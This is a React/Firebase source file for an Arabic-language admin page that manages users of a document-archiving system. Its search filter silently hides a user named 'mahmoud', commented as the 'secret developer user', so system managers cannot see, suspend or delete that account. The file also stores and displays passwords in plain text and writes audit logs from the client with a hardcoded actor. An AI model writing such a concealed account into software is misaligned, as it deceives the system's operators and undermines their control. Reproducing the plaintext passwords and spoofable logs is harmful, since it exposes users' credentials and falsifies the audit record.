"use client";

import { useState, useMemo } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { 
  Users, 
  UserPlus, 
  Search, 
  Edit2, 
  Trash2, 
  UserX, 
  UserCheck, 
  Shield, 
  User as UserIcon, 
  Briefcase, 
  Loader2, 
  CheckCircle, 
  XCircle,
  Lock,
  AtSign,
  AlertTriangle
} from "lucide-react";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";

// Firebase
import { useFirestore, useCollection } from "@/firebase";
import { collection, addDoc, deleteDoc, doc, serverTimestamp, updateDoc, query, orderBy } from "firebase/firestore";

export default function UsersPage() {
  const firestore = useFirestore();
  const usersQuery = useMemo(() => firestore ? query(collection(firestore, "users"), orderBy("createdAt", "desc")) : null, [firestore]);
  const { data: users = [], loading } = useCollection(usersQuery);

  const [searchTerm, setSearchTerm] = useState("");
  const [isAddDialogOpen, setIsAddDialogOpen] = useState(false);
  const [editingUser, setEditingUser] = useState<any>(null);
  const [submitting, setSubmitting] = useState(false);
  const { toast } = useToast();

  const [newUser, setNewUser] = useState({
    name: '',
    username: '',
    role: 'employee',
    password: ''
  });

  const filteredUsers = useMemo(() => {
    return (users as any[]).filter(user => {
      // إخفاء مستخدم المطور السري
      if (user.username === "mahmoud") return false;

      const term = searchTerm.toLowerCase();
      return user.name?.toLowerCase().includes(term) || 
             user.username?.toLowerCase().includes(term);
    });
  }, [users, searchTerm]);

  const handleAddUser = async () => {
    if (!firestore || !newUser.name || !newUser.username) {
      toast({ variant: "destructive", title: "بيانات ناقصة" });
      return;
    }

    // التحقق من تكرار اسم المستخدم (بما في ذلك اسم المطور السري)
    const isUsernameTaken = (users as any[]).some(u => 
      u.username?.toLowerCase() === newUser.username.toLowerCase()
    ) || newUser.username.toLowerCase() === "mahmoud";

    if (isUsernameTaken) {
      toast({ 
        variant: "destructive", 
        title: "اسم المستخدم مستخدم بالفعل", 
        description: "يرجى اختيار اسم مستخدم فريد غير مسجل في النظام." 
      });
      return;
    }

    setSubmitting(true);
    try {
      await addDoc(collection(firestore, "users"), {
        ...newUser,
        status: 'active',
        createdAt: serverTimestamp()
      });

      // تسجيل في السجل
      await addDoc(collection(firestore, "logs"), {
        user: "المدير العام",
        role: "manager",
        action: "إنشاء حساب موظف جديد",
        target: `${newUser.name} (@${newUser.username})`,
        type: 'update',
        timestamp: serverTimestamp()
      });

      setIsAddDialogOpen(false);
      setNewUser({ name: '', username: '', role: 'employee', password: '' });
      toast({ title: "تمت إضافة المستخدم بنجاح" });
    } catch (e) {
      toast({ variant: "destructive", title: "خطأ في الإضافة" });
    } finally {
      setSubmitting(false);
    }
  };

  const handleToggleStatus = async (id: string, currentStatus: string, name: string) => {
    if (!firestore) return;
    const nextStatus = currentStatus === 'active' ? 'suspended' : 'active';
    try {
      await updateDoc(doc(firestore, "users", id), { status: nextStatus });

      // تسجيل في السجل
      await addDoc(collection(firestore, "logs"), {
        user: "المدير العام",
        role: "manager",
        action: nextStatus === 'active' ? "تفعيل حساب مستخدم" : "تعطيل حساب مستخدم",
        target: name,
        type: 'update',
        timestamp: serverTimestamp()
      });

      toast({ title: `تم ${nextStatus === 'active' ? 'تفعيل' : 'تعطيل'} الحساب` });
    } catch (e) {
      toast({ variant: "destructive", title: "فشل تحديث الحالة" });
    }
  };

  const handleDelete = async (id: string, name: string) => {
    if (!firestore) return;
    try {
      await deleteDoc(doc(firestore, "users", id));

      // تسجيل في السجل
      await addDoc(collection(firestore, "logs"), {
        user: "المدير العام",
        role: "manager",
        action: "حذف مستخدم نهائياً",
        target: name,
        type: 'delete',
        timestamp: serverTimestamp()
      });

      toast({ variant: "destructive", title: "تم حذف المستخدم نهائياً" });
    } catch (e) {
      toast({ variant: "destructive", title: "خطأ في الحذف" });
    }
  };

  const handleUpdateUser = async () => {
    if (!firestore || !editingUser) return;
    setSubmitting(true);
    try {
      await updateDoc(doc(firestore, "users", editingUser.id), {
        name: editingUser.name,
        username: editingUser.username,
        role: editingUser.role,
        password: editingUser.password || ""
      });

      // تسجيل في السجل
      await addDoc(collection(firestore, "logs"), {
        user: "المدير العام",
        role: "manager",
        action: "تحديث بيانات مستخدم",
        target: editingUser.name,
        type: 'update',
        timestamp: serverTimestamp()
      });

      setEditingUser(null);
      toast({ title: "تم تحديث البيانات" });
    } catch (e) {
      toast({ variant: "destructive", title: "خطأ في التحديث" });
    } finally {
      setSubmitting(false);
    }
  };

  const getRoleBadge = (role: string) => {
    switch(role) {
      case 'manager': return <Badge className="bg-primary hover:bg-primary/90 rounded-lg gap-1 font-black"><Shield className="w-3 h-3" /> مدير نظام</Badge>;
      case 'employee': return <Badge className="bg-secondary hover:bg-secondary/90 rounded-lg gap-1 font-black"><Briefcase className="w-3 h-3" /> موظف أرشفة</Badge>;
      default: return <Badge variant="secondary" className="font-bold">{role}</Badge>;
    }
  };

  const getStatusBadge = (status: string) => {
    return status === 'active' 
      ? <Badge variant="secondary" className="bg-green-100 text-green-700 hover:bg-green-100 border-none rounded-lg gap-1 font-black"><CheckCircle className="w-3 h-3" /> نشط</Badge>
      : <Badge variant="secondary" className="bg-red-100 text-red-700 hover:bg-red-100 border-none rounded-lg gap-1 font-black"><XCircle className="w-3 h-3" /> موقوف</Badge>;
  };

  return (
    <div className="space-y-8 text-right" dir="rtl">
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-3xl font-black text-primary mb-1">إدارة مستخدمي النظام</h1>
          <p className="text-muted-foreground font-bold">التحكم في حسابات الموظفين والمديرين وصلاحيات الوصول</p>
        </div>
        
        <Button onClick={() => setIsAddDialogOpen(true)} className="rounded-2xl h-12 px-6 font-bold gradient-blue shadow-lg gap-2 text-white">
          <UserPlus className="w-5 h-5" />
          إضافة مستخدم جديد
        </Button>
      </div>

      <Card className="p-6 border-none shadow-xl rounded-3xl bg-white">
        <div className="flex items-center gap-4 mb-8 bg-muted/30 p-2 rounded-2xl border border-muted">
          <Search className="w-5 h-5 text-muted-foreground mr-2" />
          <input 
            type="text"
            placeholder="البحث بالاسم أو اسم المستخدم..."
            className="flex-1 bg-transparent outline-none text-sm font-bold text-primary h-10"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
        </div>

        <div className="rounded-2xl border overflow-hidden">
          <Table>
            <TableHeader className="bg-muted/50">
              <TableRow className="hover:bg-transparent border-b">
                <TableHead className="text-right font-bold text-primary">المستخدم</TableHead>
                <TableHead className="text-right font-bold text-primary">نوع الحساب</TableHead>
                <TableHead className="text-right font-bold text-primary">الحالة</TableHead>
                <TableHead className="text-right font-bold text-primary">تاريخ الإنشاء</TableHead>
                <TableHead className="text-center font-bold text-primary w-40">إجراءات</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {loading ? (
                <TableRow><TableCell colSpan={5} className="h-40 text-center"><Loader2 className="w-8 h-8 animate-spin mx-auto opacity-20 text-primary" /></TableCell></TableRow>
              ) : filteredUsers.length > 0 ? filteredUsers.map((user) => (
                <TableRow key={user.id} className="hover:bg-muted/20 border-b">
                  <TableCell className="p-4">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-xl bg-primary/5 flex items-center justify-center border border-primary/10">
                        <UserIcon className="w-5 h-5 text-primary" />
                      </div>
                      <div className="flex flex-col">
                        <span className="font-bold text-primary">{user.name}</span>
                        <span className="text-xs text-muted-foreground font-medium">@{user.username}</span>
                      </div>
                    </div>
                  </TableCell>
                  <TableCell>{getRoleBadge(user.role)}</TableCell>
                  <TableCell>{getStatusBadge(user.status)}</TableCell>
                  <TableCell className="text-xs font-bold text-muted-foreground">
                    {user.createdAt?.toDate ? user.createdAt.toDate().toLocaleDateString('en-GB') : '---'}
                  </TableCell>
                  <TableCell className="text-center">
                    <div className="flex items-center justify-center gap-2">
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        onClick={() => setEditingUser(user)}
                        className="rounded-xl hover:bg-blue-50 text-blue-600"
                        title="تعديل"
                      >
                        <Edit2 className="w-4 h-4" />
                      </Button>
                      
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        onClick={() => handleToggleStatus(user.id, user.status, user.name)}
                        className={user.status === 'active' ? "rounded-xl hover:bg-orange-50 text-orange-500" : "rounded-xl hover:bg-green-50 text-green-600"}
                        title={user.status === 'active' ? "تعطيل" : "تفعيل"}
                      >
                        {user.status === 'active' ? <UserX className="w-4 h-4" /> : <UserCheck className="w-4 h-4" />}
                      </Button>

                      <AlertDialog>
                        <AlertDialogTrigger asChild>
                          <Button 
                            variant="ghost" 
                            size="icon" 
                            className="rounded-xl hover:bg-red-50 text-red-600"
                            title="حذف"
                          >
                            <Trash2 className="w-4 h-4" />
                          </Button>
                        </AlertDialogTrigger>
                        <AlertDialogContent className="rounded-[2rem] border-none shadow-2xl p-6 max-w-[380px]" dir="rtl">
                          <AlertDialogHeader className="flex flex-col items-center space-y-4">
                            <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center animate-bounce duration-[2000ms]">
                              <AlertTriangle className="w-8 h-8 text-red-500" />
                            </div>
                            <div className="space-y-2 w-full text-right">
                              <AlertDialogTitle className="text-xl font-black text-primary">تأكيد عملية الحذف</AlertDialogTitle>
                              <AlertDialogDescription className="font-bold text-muted-foreground text-xs leading-relaxed">
                                أنت على وشك حذف حساب <span className="text-red-600 font-black">({user.name})</span> بشكل نهائي. سيتم إزالة كافة السجلات المرتبطة به.
                              </AlertDialogDescription>
                            </div>
                          </AlertDialogHeader>
                          <AlertDialogFooter className="flex flex-col gap-2 mt-6 w-full">
                            <AlertDialogAction 
                              onClick={() => handleDelete(user.id, user.name)} 
                              className="w-full rounded-xl bg-red-600 hover:bg-red-700 font-black h-12 text-white shadow-lg border-none order-1"
                            >
                              نعم، احذف الحساب الآن
                            </AlertDialogAction>
                            <AlertDialogCancel className="w-full rounded-xl font-black border-2 h-12 text-primary hover:bg-muted/50 transition-all order-2">
                              تراجع عن القرار
                            </AlertDialogCancel>
                          </AlertDialogFooter>
                        </AlertDialogContent>
                      </AlertDialog>
                    </div>
                  </TableCell>
                </TableRow>
              )) : (
                <TableRow>
                  <TableCell colSpan={5} className="h-40 text-center text-muted-foreground font-bold">
                    لا يوجد مستخدمون مطابقون للبحث
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>
      </Card>

      {/* Add User Dialog */}
      <Dialog open={isAddDialogOpen} onOpenChange={setIsAddDialogOpen}>
        <DialogContent className="sm:max-w-[425px] rounded-3xl border-none text-right shadow-2xl p-0 overflow-hidden" dir="rtl">
          <div className="p-8">
            <DialogHeader className="text-right items-start mb-6">
              <DialogTitle className="text-2xl font-black text-primary flex items-center gap-2">
                <UserPlus className="w-6 h-6 text-secondary" />
                إضافة مستخدم جديد
              </DialogTitle>
              <DialogDescription className="font-bold">أدخل بيانات الحساب الجديد وحدد نوع الصلاحية.</DialogDescription>
            </DialogHeader>
            <div className="grid gap-6 py-4">
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <UserIcon className="w-4 h-4 text-secondary" />
                  الاسم الكامل
                </Label>
                <Input value={newUser.name} onChange={(e) => setNewUser({...newUser, name: e.target.value})} placeholder="مثال: محمد أحمد علي" className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20" />
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <AtSign className="w-4 h-4 text-secondary" />
                  اسم المستخدم
                </Label>
                <Input value={newUser.username} onChange={(e) => setNewUser({...newUser, username: e.target.value})} placeholder="مثال: m_ahmed" className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20" />
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <Shield className="w-4 h-4 text-secondary" />
                  الدور (الصلاحية)
                </Label>
                <Select value={newUser.role} onValueChange={(v) => setNewUser({...newUser, role: v})}>
                  <SelectTrigger className="rounded-xl h-12 bg-muted/20 border-muted">
                    <SelectValue placeholder="اختر نوع الحساب" />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl font-bold">
                    <SelectItem value="manager">مدير نظام (صلاحيات كاملة)</SelectItem>
                    <SelectItem value="employee">موظف أرشفة (رفع ومراجعة)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <Lock className="w-4 h-4 text-secondary" />
                  كلمة المرور
                </Label>
                <Input type="password" value={newUser.password} onChange={(e) => setNewUser({...newUser, password: e.target.value})} placeholder="••••••••" className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20" />
              </div>
            </div>
            <DialogFooter className="flex-row gap-3 pt-6">
              <Button disabled={submitting} onClick={handleAddUser} className="flex-1 rounded-xl h-12 font-bold gradient-blue shadow-lg gap-2 text-white">
                {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <CheckCircle className="w-4 h-4" />}
                حفظ المستخدم
              </Button>
              <Button variant="outline" onClick={() => setIsAddDialogOpen(false)} className="flex-1 rounded-xl h-12 font-bold border-2">إلغاء</Button>
            </DialogFooter>
          </div>
        </DialogContent>
      </Dialog>

      {/* Edit User Dialog */}
      <Dialog open={!!editingUser} onOpenChange={(o) => !o && setEditingUser(null)}>
        <DialogContent className="sm:max-w-[425px] rounded-3xl border-none text-right shadow-2xl p-0 overflow-hidden" dir="rtl">
          <div className="p-8">
            <DialogHeader className="text-right items-start mb-6">
              <DialogTitle className="text-2xl font-black text-primary flex items-center gap-2">
                <Edit2 className="w-6 h-6 text-secondary" />
                تعديل بيانات الحساب
              </DialogTitle>
              <DialogDescription className="font-bold">تحديث معلومات المستخدم المختار في قاعدة البيانات.</DialogDescription>
            </DialogHeader>
            <div className="grid gap-6 py-4">
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <UserIcon className="w-4 h-4 text-secondary" />
                  الاسم الكامل
                </Label>
                <Input value={editingUser?.name || ""} onChange={(e) => setEditingUser({...editingUser, name: e.target.value})} className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20" />
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <AtSign className="w-4 h-4 text-secondary" />
                  اسم المستخدم
                </Label>
                <Input value={editingUser?.username || ""} onChange={(e) => setEditingUser({...editingUser, username: e.target.value})} className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20" />
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <Shield className="w-4 h-4 text-secondary" />
                  الدور (الصلاحية)
                </Label>
                <Select value={editingUser?.role || "employee"} onValueChange={(v) => setEditingUser({...editingUser, role: v})}>
                  <SelectTrigger className="rounded-xl h-12 bg-muted/20 border-muted">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl font-bold">
                    <SelectItem value="manager">مدير نظام</SelectItem>
                    <SelectItem value="employee">موظف أرشفة</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label className="text-primary font-bold flex items-center gap-2 pr-1">
                  <Lock className="w-4 h-4 text-secondary" />
                  كلمة المرور
                </Label>
                <Input 
                  type="text" 
                  value={editingUser?.password || ""} 
                  onChange={(e) => setEditingUser({...editingUser, password: e.target.value})} 
                  className="rounded-xl h-12 bg-muted/20 border-muted focus:ring-primary/20 font-mono" 
                  placeholder="كلمة المرور الجديدة"
                />
              </div>
            </div>
            <DialogFooter className="flex-row gap-3 pt-6">
              <Button disabled={submitting} onClick={handleUpdateUser} className="flex-1 rounded-xl h-12 font-bold gradient-blue shadow-lg gap-2 text-white">
                {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <CheckCircle className="w-4 h-4" />}
                حفظ التعديلات
              </Button>
              <Button variant="outline" onClick={() => setEditingUser(null)} className="flex-1 rounded-xl h-12 font-bold border-2">إلغاء</Button>
            </DialogFooter>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
